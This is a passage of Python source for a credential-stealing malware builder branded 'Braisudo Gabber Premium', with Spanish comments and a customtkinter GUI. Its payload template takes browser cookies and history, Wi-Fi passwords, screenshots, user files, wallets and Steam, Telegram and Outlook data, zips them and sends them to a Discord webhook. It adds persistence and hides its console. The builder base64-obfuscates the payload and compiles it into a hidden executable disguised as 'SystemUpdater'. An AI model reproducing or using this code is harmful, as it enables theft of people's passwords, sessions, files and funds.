            tmp = os.path.join(tempfile.gettempdir(), "gabber_cookies_%d.db" % os.getpid())
            try:
                shutil.copy2(cookie_db, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 300")
                for host, name, value in cur.fetchall():
                    if host:
                        lines.append("[%s] %s -> %s = %s"
                                     % (bname, host, name, _decrypt_chromium(value, key)[:60]))
                conn.close()
            except Exception:
                pass
            finally:
                try:
                    os.remove(tmp)
                except Exception:
                    pass
    return "\n".join(lines) if lines else None


def get_browser_history():
    lines = []
    for bname, root in BROWSER_ROOTS:
        if not os.path.isdir(root):
            continue
        for profile in _iter_chromium_profiles(root):
            history_db = os.path.join(profile, "History")
            if not os.path.exists(history_db):
                continue
            tmp = os.path.join(tempfile.gettempdir(), "gabber_history_%d.db" % os.getpid())
            try:
                shutil.copy2(history_db, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                for url, title in cur.fetchall():
                    if url:
                        lines.append("[%s] %s -> %s" % (bname, (title or "")[:50], url))
                conn.close()
            except Exception:
                pass
            finally:
                try:
                    os.remove(tmp)
                except Exception:
                    pass
    return "\n".join(lines) if lines else None


def get_wifi_passwords():
    try:
        output = run_hidden('netsh wlan show profiles', shell=True,
                            capture_output=True, text=True).stdout or ""
    except Exception:
        return None

    profiles = []
    for line in output.split("\n"):
        if ":" in line:
            value = line.split(":", 1)[1].strip()
            if value:
                profiles.append(value)

    wifi = []
    for profile in profiles[:40]:
        try:
            details = run_hidden('netsh wlan show profile name="%s" key=clear' % profile,
                                 shell=True, capture_output=True, text=True).stdout or ""
        except Exception:
            continue
        for line in details.split("\n"):
            low = line.lower()
            if ("key content" in low or "contenido de la clave" in low) and ":" in line:
                wifi.append(profile + " : " + line.split(":", 1)[1].strip())
                break
    return "\n".join(wifi) if wifi else None


def take_screenshot():
    path = os.path.join(tempfile.gettempdir(), "gabber_screenshot.png")
    try:
        from PIL import ImageGrab
        ImageGrab.grab().save(path)
        return path
    except Exception:
        pass
    try:
        import mss
        with mss.mss() as sct:
            sct.shot(output=path)
        return path
    except Exception:
        return None


def grab_files():
    files = []
    locations = [
        os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"), os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Videos"), os.path.expanduser("~/Music"),
        os.path.expanduser("~/Dropbox"), os.path.expanduser("~/OneDrive"),
        os.path.expanduser("~/Google Drive"),
    ]
    extensions = [
        ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".mp3", ".mp4", ".avi", ".mkv", ".mov",
        ".exe", ".msi", ".iso", ".psd", ".ai", ".eps",
        ".db", ".sqlite", ".sqlite3", ".wallet", ".key", ".seed", ".json", ".dat",
    ]
    max_size = 5 * 1024 * 1024
    for location in locations:
        if os.path.exists(location):
            try:
                for f in os.listdir(location):
                    fp = os.path.join(location, f)
                    if os.path.isfile(fp) and \
                            os.path.splitext(f)[1].lower() in extensions and \
                            os.path.getsize(fp) < max_size:
                        files.append(fp)
            except Exception:
                pass
    return files[:50]


def get_steam():
    out = []
    for path in [os.path.expandvars(r"%PROGRAMFILES(X86)%\Steam"),
                 os.path.expandvars(r"%PROGRAMFILES%\Steam"),
                 os.path.expandvars(r"%LOCALAPPDATA%\Steam")]:
        if os.path.exists(path):
            out.append("Steam found at: " + path)
            try:
                for f in os.listdir(path):
                    if f.startswith("ssfn") and not f.endswith(".txt"):
                        out.append("SSFN file: " + f)
            except Exception:
                pass
            lu = os.path.join(path, "config", "loginusers.vdf")
            if os.path.exists(lu):
                try:
                    with open(lu, "r", errors="ignore") as f:
                        for acc in re.findall(r'"AccountName"\s+"([^"]+)"', f.read()):
                            out.append("Steam Account: " + acc)
                except Exception:
                    pass
    return "\n".join(out) if out else None


def get_spotify():
    out = []
    for path in [os.path.expandvars(r"%APPDATA%\Spotify"),
                 os.path.expandvars(r"%LOCALAPPDATA%\Spotify")]:
        if os.path.exists(path):
            out.append("Spotify found at: " + path)
    return "\n".join(out) if out else None


def get_telegram():
    out = []
    tdata = os.path.expandvars(r"%APPDATA%\Telegram Desktop\tdata")
    if os.path.exists(tdata):
        out.append("Telegram data found at: " + tdata)
        try:
            for f in os.listdir(tdata):
                if f.endswith((".s8", ".map", ".dat")):
                    out.append("Telegram file: " + f)
        except Exception:
            pass
    return "\n".join(out) if out else None


def get_outlook():
    out = []
    for path in [os.path.expandvars(r"%APPDATA%\Microsoft\Outlook"),
                 os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Outlook")]:
        if os.path.exists(path):
            out.append("Outlook found at: " + path)
            try:
                for f in os.listdir(path):
                    if f.endswith((".pst", ".ost", ".dat")):
                        out.append("Outlook file: " + f)
            except Exception:
                pass
    return "\n".join(out) if out else None


# ============ RECOLECCION ============

# (clave_modulo, carpeta_zip, emoji, titulo, nombre_fichero, funcion)
SECTIONS = [
    ("system_info",       "01_System",     "[SYS]",  "SYSTEM INFORMATION",  "system_info.txt",       get_system_info),
    ("discord",           "02_Discord",    "[DSC]",  "DISCORD TOKENS",      "discord_tokens.txt",    get_discord_text),
    ("crypto_wallets",    "03_Crypto",     "[WLT]",  "CRYPTO WALLETS",      "crypto_wallets.txt",    get_wallets_text),
    ("browser_passwords", "04_Passwords",  "[PWD]",  "BROWSER PASSWORDS",   "browser_passwords.txt", get_browser_passwords),
    ("browser_cookies",   "05_Cookies",    "[CKI]",  "BROWSER COOKIES",     "browser_cookies.txt",   get_browser_cookies),
    ("browser_history",   "06_History",    "[HST]",  "BROWSER HISTORY",     "browser_history.txt",   get_browser_history),
    ("wifi_passwords",    "07_WiFi",       "[WIF]",  "WIFI PASSWORDS",      "wifi_passwords.txt",    get_wifi_passwords),
    ("steam",             "08_Steam",      "[STM]",  "STEAM",               "steam_data.txt",        get_steam),
    ("spotify",           "09_Spotify",    "[SPT]",  "SPOTIFY",             "spotify_data.txt",      get_spotify),
    ("telegram",          "10_Telegram",   "[TGM]",  "TELEGRAM",            "telegram_data.txt",     get_telegram),
    ("outlook",           "11_Outlook",    "[OTL]",  "OUTLOOK",             "outlook_data.txt",      get_outlook),
]


def collect_sections():
    """Devuelve (textos, ficheros) totalmente separados por categoria."""
    collected = []
    files = []
    for key, folder, emoji, title, fname, fn in SECTIONS:
        if not MODULES.get(key, False):
            continue
        try:
            data = fn()
        except Exception as e:
            log("section %s error: %r" % (key, e))
            collected.append((folder, emoji, title, fname,
                              "ERROR al recoger esta seccion: %r" % (e,)))
            continue
        if not data:
            continue
        if isinstance(data, tuple):
            content, extra = data
            if content:
                collected.append((folder, emoji, title, fname, content))
            for f in (extra or []):
                files.append((folder, f))
        else:
            collected.append((folder, emoji, title, fname, data))
    return collected, files


def build_manifest(collected, files):
    lines = []
    lines.append("BRAISUDO GABBER PREMIUM v5.3.1 - MANIFIESTO")
    lines.append("ID: %s" % PAYLOAD_ID)
    lines.append("PC: %s | User: %s" % (platform.node(), getpass.getuser()))
    lines.append("Fecha: %s" % datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    lines.append("=" * 55)
    lines.append("")
    lines.append("CATEGORIAS RECOGIDAS (%d):" % len(collected))
    for folder, emoji, title, fname, content in collected:
        lines.append("  [OK] %-20s -> %s/%s (%d chars)"
                     % (title, folder, fname, len(content)))
    lines.append("")
    by_folder = {}
    for folder, _fp in files:
        by_folder[folder] = by_folder.get(folder, 0) + 1
    lines.append("FICHEROS ADJUNTOS (%d):" % len(files))
    for folder, count in sorted(by_folder.items()):
        lines.append("  [OK] %-20s -> %d fichero(s)" % (folder, count))
    lines.append("")
    return "\n".join(lines)


# ============ ZIP ============

def build_zip(collected, files, manifest):
    tmp = tempfile.mkdtemp(prefix="gabber_zip_")
    try:
        for folder, emoji, title, fname, content in collected:
            d = os.path.join(tmp, folder)
            os.makedirs(d, exist_ok=True)
            try:
                with open(os.path.join(d, fname), "w", encoding="utf-8") as f:
                    f.write(content)
            except Exception:
                pass

        for idx, (folder, fp) in enumerate(files):
            d = os.path.join(tmp, folder)
            os.makedirs(d, exist_ok=True)
            try:
                if os.path.exists(fp):
                    base = os.path.basename(fp) or ("file_%d" % idx)
                    shutil.copy2(fp, os.path.join(d, base))
            except Exception:
                pass

        try:
            with open(os.path.join(tmp, "_MANIFEST.txt"), "w", encoding="utf-8") as f:
                f.write(manifest)
        except Exception:
            pass

        zip_path = os.path.join(tempfile.gettempdir(), "gabber_%s.zip" % PAYLOAD_ID)
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
            for root, _dirs, fs in os.walk(tmp):
                for f in fs:
                    full = os.path.join(root, f)
                    rel = os.path.relpath(full, tmp)
                    z.write(full, rel)
        return zip_path
    except Exception as e:
        log("build_zip error: %s" % e)
        return None
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# ============ MAIN ============

def run():
    log("=== payload iniciado (id=%s) ===" % PAYLOAD_ID)
    sender = Sender(WEBHOOK)

    pc = platform.node()
    user = getpass.getuser()
    when = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    sender.send_embed(
        "BRAISUDO GABBER PREMIUM",
        "**Payload ejecutado** - cada categoria se envia por separado.",
        fields=[("PC", pc), ("Usuario", user), ("Hora", when), ("ID", PAYLOAD_ID)],
        color=COLOR_CYAN,
        footer="Cada categoria va en su propio mensaje y en su carpeta del ZIP")

    collected, files = collect_sections()

    if MODULES.get("screenshot", True):
        try:
            ss = take_screenshot()
            if ss and os.path.exists(ss):
                files.append(("97_Screenshot", ss))
        except Exception as e:
            log("screenshot error: %r" % e)

    if MODULES.get("file_grabber", False):
        try:
            for fp in grab_files():
                files.append(("98_UserFiles", fp))
        except Exception as e:
            log("grab_files error: %r" % e)

    log("recolectado: %d categorias, %d ficheros" % (len(collected), len(files)))

    # --- cada categoria en su PROPIO mensaje, bien diferenciada ---
    for folder, emoji, title, fname, content in collected:
        sender.send_section(emoji, title, content)

    manifest = build_manifest(collected, files)

    # --- resumen por categoria en embed ---
    fields = []
    for folder, emoji, title, fname, content in collected:
        fields.append(("%s %s" % (emoji, title), "%d chars" % len(content)))
    files_total = len(files)
    if files_total:
        fields.append(("[FIL] Ficheros", str(files_total)))

    sender.send_embed(
        "RESUMEN DE RECOLECCION",
        "Categorias enviadas: **%d** | Ficheros: **%d**" % (len(collected), files_total),
        fields=fields[:24],
        color=COLOR_GREEN,
        footer="ID %s" % PAYLOAD_ID)

    summary = ("PC: %s | User: %s | Categorias: %d | Ficheros: %d"
               % (pc, user, len(collected), files_total))

    if collected or files:
        zip_path = build_zip(collected, files, manifest)
        if zip_path:
            try:
                size = os.path.getsize(zip_path)
            except Exception:
                size = 0
            ok = sender.send_file(zip_path, "gabber_%s.zip" % PAYLOAD_ID,
                                  content="**ZIP ORGANIZADO**\n%s\n%.1f KB\n"
                                          "(carpetas numeradas por categoria)"
                                          % (summary, size / 1024.0))
            if not ok:
                sender.send_text("**AVISO**: no se pudo subir el ZIP.\n" + summary)
            try:
                os.remove(zip_path)
            except Exception:
                pass

    sender.send_embed(
        "FIN DEL PAYLOAD",
        summary,
        fields=[("Enviados OK", str(sender.sent)), ("Fallidos", str(sender.failed))],
        color=COLOR_MAGENTA)
    log("=== payload terminado ===")


def main():
    try:
        run()
    except Exception:
        import traceback
        tb = traceback.format_exc()
        log("FATAL:\n" + tb)
        try:
            Sender(WEBHOOK).send_text("**FATAL ERROR**\n```\n" + tb[-1500:] + "\n```")
        except Exception:
            pass


hide_console()
try:
    add_persistence()
except Exception:
    pass
try:
    if not check_mutex():
        log("mutex activo, saliendo")
        sys.exit(0)
except Exception:
    pass

if __name__ == "__main__":
    main()
'''

    # ---- generación ----

    def generate_payload(self, webhook, modules, payload_id=None):
        if not payload_id:
            payload_id = hashlib.md5(f"{webhook}{time.time()}".encode()).hexdigest()[:8]
        payload = self.payload_template
        payload = payload.replace("__WEBHOOK__", repr(webhook))
        payload = payload.replace("__PAYLOAD_ID__", repr(payload_id))
        payload = payload.replace("__MODULES__", repr(dict(modules)))
        return payload, payload_id

    def obfuscate_code(self, code):
        encoded = base64.b64encode(code.encode("utf-8")).decode("ascii")
        return ("import base64\n"
                "exec(base64.b64decode('%s').decode('utf-8'))\n" % encoded)

    def create_payload_file(self, webhook, modules, output_name="SystemUpdater",
                            obfuscate=True):
        payload, payload_id = self.generate_payload(webhook, modules)
        if obfuscate:
            payload = self.obfuscate_code(payload)
        output_dir = resolve_dir(self.store.config.get("output_dir", "output"))
        filepath = output_dir / f"{output_name}_{payload_id}.py"
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(payload)
        return str(filepath), payload_id

    @staticmethod
    def _python_interpreter():
        return real_python()

    def compile_to_exe(self, py_file, output_name="SystemUpdater"):
        self.last_error = ""
        try:
            py_exe = self._python_interpreter()
            if not py_exe:
                self.last_error = ("No se encontró un intérprete de Python. "
                                   "Instálalo desde python.org para poder compilar.")
                return None

            output_dir = os.path.dirname(os.path.abspath(py_file)) or "."
            exe_name = re.sub(r"[^A-Za-z0-9_\-]", "_", output_name) or "SystemUpdater"
            old_exe = os.path.join(output_dir, f"{exe_name}.exe")
            try:
                if os.path.exists(old_exe):
                    os.remove(old_exe)
            except Exception:
                pass

            for pkg in (('pyinstaller',), ('Pillow', 'cryptography', 'pywin32')):
                try:
                    run_hidden([py_exe, '-m', 'pip', 'install', *pkg, '-q'],
                               capture_output=True, timeout=600,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except Exception:
                    pass

            cmd = [
                py_exe, '-m', 'PyInstaller',
                '--onefile', '--noconsole', '--noconfirm', '--clean',
                '--log-level', 'WARN',
                '--name', exe_name,
                '--distpath', output_dir,
                '--workpath', os.path.join(output_dir, 'build'),
                '--specpath', output_dir,
                '--hidden-import', 'PIL',
                '--hidden-import', 'PIL.Image',
                '--hidden-import', 'PIL.ImageGrab',
                '--hidden-import', 'cryptography',
                '--hidden-import', 'cryptography.hazmat.primitives.ciphers.aead',
                '--hidden-import', 'cryptography.hazmat.decrepit.ciphers.algorithms',
                '--hidden-import', 'sqlite3',
                '--hidden-import', 'winreg',
                '--hidden-import', 'ctypes',
                '--hidden-import', 'getpass',
                '--hidden-import', 'ssl',
                '--hidden-import', 'http.client',
                '--hidden-import', 'urllib.request',
                '--hidden-import', 'urllib.parse',
                '--hidden-import', 'urllib.error',
                '--hidden-import', 'email',
                '--hidden-import', 'mss',
                '--hidden-import', 'mss.windows',
                '--hidden-import', 'win32event',
                '--hidden-import', 'win32api',
                '--hidden-import', 'winerror',
                py_file,
            ]

            result = run_hidden(cmd, capture_output=True, text=True, timeout=1800)

            for folder in ('build', '__pycache__'):
                fp = os.path.join(output_dir, folder)
                if os.path.exists(fp):
                    shutil.rmtree(fp, ignore_errors=True)
            try:
                for spec in os.listdir(output_dir):
                    if spec.endswith('.spec'):
                        os.remove(os.path.join(output_dir, spec))
            except Exception:
                pass

            if result.returncode == 0 and os.path.exists(old_exe):
                return old_exe

            tail = (result.stderr or result.stdout or "").strip()
            self.last_error = tail[-600:] if tail else f"PyInstaller devolvió {result.returncode}"
            try:
                with open(os.path.join(output_dir, "pyinstaller.log"), "w",
                          encoding="utf-8") as f:
                    f.write((result.stdout or "") + "\n\n" + (result.stderr or ""))
            except Exception:
                pass
            return None

        except subprocess.TimeoutExpired:
            self.last_error = "PyInstaller tardó demasiado (timeout 30 min)."
            return None
        except Exception as e:
            self.last_error = f"{e.__class__.__name__}: {e}"
            return None


# ============ WIDGETS ============

class GlowButton(ctk.CTkFrame):
    def __init__(self, parent, text, color, hover, glow, command,
                 height=42, radius=12, font=None, text_color="#04060d", width=None):
        super().__init__(parent, fg_color=glow, corner_radius=radius + 4,
                         **({"width": width} if width else {}))
        self.btn = ctk.CTkButton(
            self, text=text, command=command, height=height,
            corner_radius=radius, fg_color=color, hover_color=hover,
            text_color=text_color, font=font or ("Segoe UI Semibold", 13, "bold"))
        self.btn.pack(fill="both", expand=True, padx=2, pady=2)

    def set_text(self, text):
        try:
            self.btn.configure(text=text)
        except Exception:
            pass

    def set_enabled(self, enabled):
        try:
            self.btn.configure(state="normal" if enabled else "disabled")
        except Exception:
            pass


class GhostButton(ctk.CTkButton):
    def __init__(self, parent, text, command, accent=Theme.BORDER_HI,
                 width=None, height=32):
        super().__init__(
            parent, text=text, command=command, height=height,
            fg_color=Theme.BG_INPUT, hover_color=Theme.BG_HOVER,
            text_color=Theme.TEXT_DIM, border_width=1, border_color=accent,
            corner_radius=9, font=FONT_SMALL,
            **({"width": width} if width else {}))


class NeonEntry(ctk.CTkEntry):
    def __init__(self, parent, placeholder="", show=None, height=44):
        super().__init__(
            parent, placeholder_text=placeholder, height=height,
            fg_color=Theme.BG_INPUT, border_color=Theme.BORDER, border_width=1,
            text_color=Theme.TEXT, corner_radius=10, font=FONT_BODY,
            **({"show": show} if show else {}))
        self.bind("<FocusIn>", lambda e: self.configure(border_color=Theme.CYAN))
        self.bind("<FocusOut>", lambda e: self.configure(border_color=Theme.BORDER))


class FieldLabel(ctk.CTkLabel):
    def __init__(self, parent, text, color=Theme.TEXT_DIM):
        super().__init__(parent, text=text, font=FONT_LABEL, text_color=color, anchor="w")


class Card(ctk.CTkFrame):
    def __init__(self, parent, title="", accent=Theme.BORDER):
        super().__init__(parent, fg_color=Theme.BG_CARD, corner_radius=14,
                         border_width=1, border_color=accent)
        self.body = self
        if title:
            head = ctk.CTkFrame(self, fg_color="transparent")
            head.pack(fill="x", padx=16, pady=(14, 6))
            ctk.CTkFrame(head, fg_color=accent, width=3, height=15,
                         corner_radius=2).pack(side="left", padx=(0, 9))
            ctk.CTkLabel(head, text=title, font=FONT_H,
                         text_color=accent if accent != Theme.BORDER else Theme.TEXT
                         ).pack(side="left")
            self.body = ctk.CTkFrame(self, fg_color="transparent")
            self.body.pack(fill="both", expand=True, padx=16, pady=(0, 16))


class ModuleChip(ctk.CTkFrame):
    def __init__(self, parent, key, icon, label, active, accent, on_change):
        super().__init__(parent, fg_color=Theme.BG_CARD, corner_radius=12,
                         border_width=1, border_color=Theme.BORDER, height=62)
        self.key = key
        self.active = bool(active)
        self.accent = accent
        self.on_change = on_change
        self.pack_propagate(False)

        self.indicator = ctk.CTkFrame(self, fg_color=Theme.BORDER, width=3, corner_radius=2)
        self.indicator.pack(side="left", fill="y", pady=1)

        inner = ctk.CTkFrame(self, fg_color="transparent")
        inner.pack(side="left", fill="both", expand=True, padx=12, pady=10)

        self.title = ctk.CTkLabel(inner, text=f"{icon}  {label}",
                                  font=("Segoe UI Semibold", 12),
                                  text_color=Theme.TEXT, anchor="w")
        self.title.pack(anchor="w")

        self.state = ctk.CTkLabel(inner, text=t("mod_on") if self.active else t("mod_off"),
                                  font=FONT_TINY,
                                  text_color=accent if self.active else Theme.TEXT_MUTE,
                                  anchor="w")
        self.state.pack(anchor="w")

        for w in (self, inner, self.title, self.state, self.indicator):
            w.bind("<Button-1>", self._toggle)
            w.bind("<Enter>", self._hover_in)
            w.bind("<Leave>", self._hover_out)

        self._paint()

    def _paint(self):
        try:
            if self.active:
                self.configure(border_color=self.accent)
                self.indicator.configure(fg_color=self.accent)
                self.state.configure(text=t("mod_on"), text_color=self.accent)
                self.title.configure(text_color=Theme.TEXT)
            else:
                self.configure(border_color=Theme.BORDER)
                self.indicator.configure(fg_color=Theme.BORDER)
                self.state.configure(text=t("mod_off"), text_color=Theme.TEXT_MUTE)
                self.title.configure(text_color=Theme.TEXT_DIM)
        except Exception:
            pass

    def _hover_in(self, _=None):
        if not self.active:
            self.configure(border_color=Theme.BORDER_HI)

    def _hover_out(self, _=None):
        if not self.active:
            self.configure(border_color=Theme.BORDER)

    def _toggle(self, _=None):
        self.active = not self.active
        self._paint()
        if self.on_change:
            self.on_change(self.key, self.active)


class NavButton(ctk.CTkFrame):
    def __init__(self, parent, icon, label, command):
        super().__init__(parent, fg_color="transparent", corner_radius=10, height=44)
        self.command = command
        self.active = False
        self.pack_propagate(False)
        self.configure(cursor="hand2")

        self.bar = ctk.CTkFrame(self, fg_color="transparent", width=3, corner_radius=2)
        self.bar.pack(side="left", fill="y", padx=(2, 0), pady=9)

        self.label = ctk.CTkLabel(self, text=f"  {icon}   {label}", font=FONT_NAV,
                                  text_color=Theme.TEXT_DIM, anchor="w", cursor="hand2")
        self.label.pack(side="left", fill="both", expand=True, padx=(10, 0))

        for w in (self, self.label, self.bar):
            w.bind("<Button-1>", lambda e: self.command())
            w.bind("<Enter>", self._hover_in)
            w.bind("<Leave>", self._hover_out)

    def _hover_in(self, _=None):
        if not self.active:
            self.configure(fg_color=Theme.BG_HOVER)

    def _hover_out(self, _=None):
        if not self.active:
            self.configure(fg_color="transparent")

    def set_active(self, active):
        self.active = active
        try:
            if active:
                self.configure(fg_color=Theme.BG_HOVER)
                self.bar.configure(fg_color=Theme.CYAN)
                self.label.configure(text_color=Theme.CYAN)
            else:
                self.configure(fg_color="transparent")
                self.bar.configure(fg_color="transparent")
                self.label.configure(text_color=Theme.TEXT_DIM)
        except Exception:
            pass


class ParticleBackground(tk.Canvas):
    def __init__(self, parent, host, count=26):
        super().__init__(parent, bg=Theme.BG_DEEP, highlightthickness=0, bd=0)
        self.host = host
        self.count = count
        self.particles = []
        self._job = None
        self._last_size = (0, 0)
        self._grid_ids = []
        self._line_state = {}

        colors = ["#0e6f86", "#6d1660", "#3a2c78", "#0a5c3d", "#1f3a63"]
        for _ in range(count):
            self.particles.append([
                random.uniform(0, 1400), random.uniform(0, 900),
                random.uniform(-0.55, 0.55), random.uniform(-0.55, 0.55),
                random.uniform(1.5, 3.0), random.choice(colors)])

        self._dot_ids = [self.create_oval(0, 0, 0, 0, fill=p[5], outline="")
                         for p in self.particles]

        self._line_ids = {}
        for i in range(count):
            for j in range(i + 1, count):
                self._line_ids[(i, j)] = self.create_line(0, 0, 0, 0, fill="#0d2038",
                                                          width=1, state="hidden")
        self._tick()

    def _build_grid(self, w, h):
        try:
            for item in self._grid_ids:
                self.delete(item)
            self._grid_ids = []
            for x in range(0, w, 64):
                self._grid_ids.append(self.create_line(x, 0, x, h, fill="#080f1c"))
            for y in range(0, h, 64):
                self._grid_ids.append(self.create_line(0, y, w, y, fill="#080f1c"))
            for item in self._grid_ids:
                self.tag_lower(item)
        except Exception:
            pass

    def _tick(self):
        try:
            if not self.winfo_exists():
                return
            w = max(self.winfo_width(), 1)
            h = max(self.winfo_height(), 1)
        except Exception:
            return

        if (w, h) != self._last_size:
            self._last_size = (w, h)
            self._build_grid(w, h)

        limit = 130 ** 2
        n = self.count
        for idx, p in enumerate(self.particles):
            p[0] += p[2]
            p[1] += p[3]
            if p[0] < 0 or p[0] > w:
                p[2] *= -1
                p[0] = max(0.0, min(float(w), p[0]))
            if p[1] < 0 or p[1] > h:
                p[3] *= -1
                p[1] = max(0.0, min(float(h), p[1]))
            self.coords(self._dot_ids[idx], p[0] - p[4], p[1] - p[4],
                        p[0] + p[4], p[1] + p[4])

        for i in range(n):
            pi = self.particles[i]
            for j in range(i + 1, n):
                pj = self.particles[j]
                dx = pi[0] - pj[0]
                dy = pi[1] - pj[1]
                key = (i, j)
                item = self._line_ids[key]
                close = (dx * dx + dy * dy) < limit
                if close:
                    self.coords(item, pi[0], pi[1], pj[0], pj[1])
                if self._line_state.get(key) != close:
                    self._line_state[key] = close
                    self.itemconfigure(item, state="normal" if close else "hidden")

        try:
            self._job = self.host.after(40, self._tick)
        except Exception:
            self._job = None

    def stop(self):
        if self._job:
            try:
                self.host.after_cancel(self._job)
            except Exception:
                pass
            self._job = None


class LangToggle(ctk.CTkFrame):
    def __init__(self, parent, current, on_change):
        super().__init__(parent, fg_color="transparent")
        self.on_change = on_change
        for code, label in (("es", "ES"), ("en", "EN")):
            active = (code == current)
            ctk.CTkButton(
                self, text=label, width=44, height=28, corner_radius=8, font=FONT_LABEL,
                fg_color=Theme.CYAN if active else Theme.BG_INPUT,
                hover_color=Theme.CYAN_DIM if active else Theme.BG_HOVER,
                text_color="#04060d" if active else Theme.TEXT_DIM,
                border_width=1, border_color=Theme.BORDER,
                command=lambda c=code: self.on_change(c)).pack(side="left", padx=(0, 6))


# ============ APLICACIÓN ============

class App(ctk.CTk):

    BASE_VIEWS = [
        ("builder", "⚡", "nav_builder"),
        ("modules", "📦", "nav_modules"),
        ("options", "⚙", "nav_options"),
        ("console", "▤", "nav_console"),
    ]
    ADMIN_VIEW = ("admin", "🛡", "nav_admin")

    def __init__(self):
        super().__init__()
        self.store = LocalStore(host=self)
        Lang.code = self.store.config.get("lang", "es")

        self.firebase = Firebase(FIREBASE_URL)
        self.generator = PayloadGenerator(self.store)
        self.hwid = get_hwid()

        self.username = ""
        self.is_admin = False
        self.module_state = dict(self.store.config.get("modules", {}))
        self.busy = False
        self._bg = None
        self._nav_buttons = {}
        self._views = {}
        self._chips = {}
        self._current_view = "builder"
        self._generated_keys = []
        self._auth_ctx = {"screen": "welcome", "prefill": "", "notice": ""}

        self.configure(fg_color=Theme.BG_DEEP)
        self._apply_icon()
        self._set_auth_geometry()
        self.protocol("WM_DELETE_WINDOW", self._on_close)
        self.show_splash()

    def after(self, ms, func=None, *args):
        try:
            return super().after(ms, func, *args)
        except Exception:
            return None

    def after_cancel(self, identifier):
        try:
            return super().after_cancel(identifier)
        except Exception:
            return None

    def _apply_icon(self):
        try:
            ico = base_dir() / "icon.ico"
            if ico.exists():
                self.iconbitmap(str(ico))
        except Exception:
            pass

    def _on_close(self):
        if self._bg:
            self._bg.stop()
        try:
            self.store.save_config()
        except Exception:
            pass
        self.destroy()

    def _set_auth_geometry(self):
        self.minsize(1000, 700)
        self._center(1100, 730)

    def _set_tool_geometry(self):
        self.minsize(1120, 720)
        self._center(1340, 880)

    def _center(self, w, h):
        try:
            sw = self.winfo_screenwidth()
            sh = self.winfo_screenheight()
            self.geometry(f"{w}x{h}+{max(0, (sw - w) // 2)}+{max(0, (sh - h) // 2 - 24)}")
        except Exception:
            pass

    def clear(self):
        if self._bg:
            try:
                self._bg.stop()
            except Exception:
                pass
            self._bg = None
        for seq in ("<Return>", "<Escape>"):
            try:
                self.unbind(seq)
            except Exception:
                pass
        for child in self.winfo_children():
            try:
                child.destroy()
            except Exception:
                pass
        self._nav_buttons = {}
        self._views = {}
        self._chips = {}

    @staticmethod
    def _clear_frame(frame):
        for child in frame.winfo_children():
            try:
                child.destroy()
            except Exception:
                pass

    def _copy(self, text):
        try:
            self.clipboard_clear()
            self.clipboard_append(text)
            return True
        except Exception:
            return False

    def set_lang(self, code):
        if code not in STRINGS:
            return
        Lang.code = code
        self.store.config["lang"] = code
        self.store.save_config()
        screen = self._auth_ctx.get("screen", "welcome")
        if screen == "login":
            self.show_login(self._auth_ctx.get("prefill", ""), self._auth_ctx.get("notice", ""))
        elif screen == "register":
            self.show_register(self._auth_ctx.get("notice", ""))
        elif screen == "maintenance":
            self.show_maintenance(self._auth_ctx.get("notice", ""))
        elif screen == "tool":
            self._rebuild_tool()
        else:
            self.show_welcome(self._auth_ctx.get("notice", ""))

    def show_splash(self):
        self.clear()
        self._auth_ctx["screen"] = "splash"
        self._set_auth_geometry()

        wrap = ctk.CTkFrame(self, fg_color=Theme.BG_DEEP)
        wrap.pack(fill="both", expand=True)
        box = ctk.CTkFrame(wrap, fg_color="transparent")
        box.place(relx=0.5, rely=0.46, anchor="center")

        ctk.CTkLabel(box, text="◈", font=("Segoe UI Semibold", 52, "bold"),
                     text_color=Theme.CYAN).pack()
        ctk.CTkLabel(box, text=TOOL_NAME, font=FONT_TITLE, text_color=Theme.TEXT).pack(pady=(6, 2))
        ctk.CTkLabel(box, text=f"v{VERSION}   ·   by {AUTHOR}", font=FONT_SMALL,
                     text_color=Theme.TEXT_MUTE).pack()

        bar = ctk.CTkProgressBar(box, width=280, height=6, corner_radius=3,
                                 progress_color=Theme.CYAN, fg_color=Theme.BG_INPUT)
        bar.pack(pady=(26, 8))
        bar.set(0)
        status = ctk.CTkLabel(box, text="…", font=FONT_TINY, text_color=Theme.TEXT_MUTE)
        status.pack()

        def pump(value, text):
            try:
                bar.set(value)
                status.configure(text=text)
            except Exception:
                pass

        def run():
            try:
                self.after(0, lambda: pump(0.3, "HWID…"))
                time.sleep(0.2)
                self.after(0, lambda: pump(0.6, self.hwid))
                time.sleep(0.2)
                maintenance = False
                offline = False
                try:
                    maintenance = self.firebase.is_maintenance()
                except FirebaseError:
                    offline = True
                self.after(0, lambda: pump(1.0, "OK"))
                time.sleep(0.2)
                if maintenance:
                    self.after(0, self.show_maintenance)
                else:
                    self.after(0, lambda: self.show_welcome(offline=offline))
            except Exception:
                self.after(0, lambda: self.show_welcome(offline=True))

        threading.Thread(target=run, daemon=True).start()

    def _auth_shell(self):
        root = ctk.CTkFrame(self, fg_color=Theme.BG_DEEP)
        root.pack(fill="both", expand=True)
        canvas = ParticleBackground(root, self)
        canvas.pack(fill="both", expand=True)
        self._bg = canvas
        return root

    def _brand_panel(self, parent):
        panel = ctk.CTkFrame(parent, fg_color="transparent")
        panel.place(relx=0.245, rely=0.5, anchor="center")
        ctk.CTkLabel(panel, text="◈", font=("Segoe UI Semibold", 44, "bold"),
                     text_color=Theme.CYAN).pack(anchor="w")
        ctk.CTkLabel(panel, text="BRAISUDO", font=FONT_BRAND, text_color=Theme.TEXT).pack(
            anchor="w", pady=(2, 0))
        ctk.CTkLabel(panel, text="GABBER PREMIUM", font=("Segoe UI Semibold", 17, "bold"),
                     text_color=Theme.MAGENTA).pack(anchor="w")
